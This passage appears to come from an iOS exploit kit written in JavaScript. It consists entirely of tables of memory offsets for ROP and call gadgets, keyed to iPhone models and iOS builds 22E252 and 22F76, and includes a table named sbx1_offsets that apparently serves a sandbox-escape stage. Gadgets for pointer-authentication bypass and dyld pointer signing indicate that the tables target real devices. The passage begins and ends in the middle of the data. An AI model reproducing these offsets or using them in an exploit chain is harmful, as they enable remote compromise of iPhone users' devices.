      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,3_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,4_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,5_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb052ecn,
      tcall_X0LG: 0x21ed99f24n,
      tcall_RLG: 0x20db46218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x26189b98cn,
      fcall_14_args_write_x8: 0x24c760f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7a2fd4n,
      transformSurface_gadget: 0x20ff2c970n,
      xpac_gadget: 0x1b63da15cn
   }
};

    sbx1_offsets = {
   "iPhone11,2_4_6_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2f82ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2612ca98cn,
      fcall_14_args_write_x8: 0x24cbe4054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af8a02cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone11,8_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2c42ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2612bd98cn,
      fcall_14_args_write_x8: 0x24cbb0054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af5602cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone12,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2c42ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2613ab98cn,
      fcall_14_args_write_x8: 0x24cbf8054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af5602cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone12,3_5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2c42ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2613ab98cn,
      fcall_14_args_write_x8: 0x24cbf8054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af5602cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone12,8_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1d42ecn,
      tcall_X0LG: 0x21f24a150n,
      tcall_RLG: 0x20dfaa178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2612e298cn,
      fcall_14_args_write_x8: 0x24cb00054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ae6802cn,
      transformSurface_gadget: 0x2103c8b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone13,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0fe2ecn,
      tcall_X0LG: 0x21f26d150n,
      tcall_RLG: 0x20dfba178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x26164e98cn,
      fcall_14_args_write_x8: 0x24cdcf054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad9502cn,
      transformSurface_gadget: 0x2103d8b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone13,2_3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1022ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24cdd3054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad9902cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone13,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1022ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24cdd3054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad9902cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ce2ecn,
      tcall_X0LG: 0x21f275150n,
      tcall_RLG: 0x20dfc2178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261db298cn,
      fcall_14_args_write_x8: 0x24ce17054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6502cn,
      transformSurface_gadget: 0x2103e0b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ce2ecn,
      tcall_X0LG: 0x21f275150n,
      tcall_RLG: 0x20dfc2178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261db298cn,
      fcall_14_args_write_x8: 0x24ce17054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6502cn,
      transformSurface_gadget: 0x2103e0b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ca2ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261a1498cn,
      fcall_14_args_write_x8: 0x24ce13054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6102cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ca2ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261a1498cn,
      fcall_14_args_write_x8: 0x24ce13054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6102cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,6_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0362ecn,
      tcall_X0LG: 0x21f261150n,
      tcall_RLG: 0x20dfae178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2619af98cn,
      fcall_14_args_write_x8: 0x24cd77054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23accd02cn,
      transformSurface_gadget: 0x2103ccb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,7_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0da2ecn,
      tcall_X0LG: 0x21f281150n,
      tcall_RLG: 0x20dfce178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261dcc98cn,
      fcall_14_args_write_x8: 0x24ce23054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad7102cn,
      transformSurface_gadget: 0x2103ecb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,8_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0da2ecn,
      tcall_X0LG: 0x21f281150n,
      tcall_RLG: 0x20dfce178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261dcc98cn,
      fcall_14_args_write_x8: 0x24ce23054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad7102cn,
      transformSurface_gadget: 0x2103ecb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone15,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2621c198cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone15,3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2621c198cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone15,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261e6698cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone15,5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261e6698cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone16,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2629b198cn,
      fcall_14_args_write_x8: 0x24d60b054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone16,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2629b198cn,
      fcall_14_args_write_x8: 0x24d60b054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
